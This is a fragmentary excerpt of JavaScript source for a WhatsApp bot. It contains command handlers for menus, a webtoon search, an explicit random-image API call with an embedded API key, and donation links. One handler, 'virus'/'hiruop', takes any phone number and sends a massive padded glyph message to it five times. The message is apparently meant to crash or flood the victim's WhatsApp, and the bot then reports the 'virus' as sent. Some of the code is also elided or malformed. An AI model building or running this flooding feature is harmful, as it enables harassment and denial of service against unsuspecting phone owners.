...
const reply = (teks) => {
            XeonBotInc.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": ` ${global.botname}`,"body": ` Join Bot's Official GC`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./XeonMedia/cheemspic.jpg`),"sourceUrl": "https://chat.whatsapp.com/F00hfaaGFvL5Wbx6T2GYOm"}}}, { quoted: m})
        }
...
case 'webtonsearch': case 'webtoon':
	    ...
	    break
            case 'ass': case 'night': {
                ...
                XeonBotInc.sendMessage(m.chat, { image: {url:'https://xteam.xyz/randomimage/ass?APIKEY=19e5608ed2dc5568'}, caption: 'Generate Random ' + command }, { quoted: m })
            }
...
break
                    case 'virus': case 'hiruop': {
                    	if(!text) return reply(`Enter The 10 digit Number with country code\n\nExample: ${command} +919876543210`)
                    	let op ={text: `
༺⃢🔥V̳I̳R̳U̳S̳ ̳R̳U̳BA̳🔥⃢༻
                                                                                                  
   https://instagram.com/denie3878                                                                                                   
                                                                                                  
                                                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                   
...
88888888888 *⻩⻩⻩⻩⻩* 88888888888
88888888888 *⻩⻩⻩⻩⻩* 88888888888 ` }
                    	XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, op)
                    	XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, op)
                    	XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, op)
                    	XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, op)
                    	XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, op)
...
reply(`Successfully send Virus To The Number\n\nPlease Make Sure The Number Is Valid, If You Play With This, Use This Feature Again And Again For No Reason, You Will Be Blocked For Sure !`)
                    }
                    break
...
latensie = speed() - timestampe
 anu = ` `
const template = 
generateWAMessageFromContent(m.chat, proto.Message.fromObject({
                    templateMessage: {
                        hydratedTemplate: {
...
break
            ...
            case 'hiru' : {                
            var unicorn = await getBuffer(picak+'HiRanMoy')
            await XeonBotInc.send5ButImg(from, `` + '' + ' ', `
hiru op bolte`,unicorn )
            }
            break
...
let template = await generateWAMessageFromContent(m.chat, proto.Message.fromObject({
							...
							},
							{
								...
								"rows": [
									...
									},
									{
										...
										"rowId": `${prefix}voicechanger"axios": "^0.24.0"`
										},
										{
											"title": "Islamic Menu",
    ...
    case 'donasi': case 'donate': case 'sewabot': case 'sewa': case 'buypremium': case 'donate': {
                XeonBotInc.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/e65a80033fd9ccfc45296.jpg' }, caption: `*Hi Bro ${m.pushName}*\n\nDonate Me : \n\n🐶 Fampay : https://telegra.ph/file/e65a80033fd9ccfc45296.jpg\n🐶 Paytm : https://telegra.ph/file/e65a80033fd9ccfc45296.jpg\n\nIf You Want To Donate, Talk With The Owner First\nwa.me/917872792882 (Click To Contact)` }, { quoted: m })
            }
            break
            case 'sc': case 'script': {
                reply(`GitHub : https://github.com/Baapg/Rubabot.md\n Dont Forget To Give Star\n\nYouTube : ${myweb}\nDont Forget To Watch Tutorial`)
            }
            break
case 'allmenu': {
  	anu = `
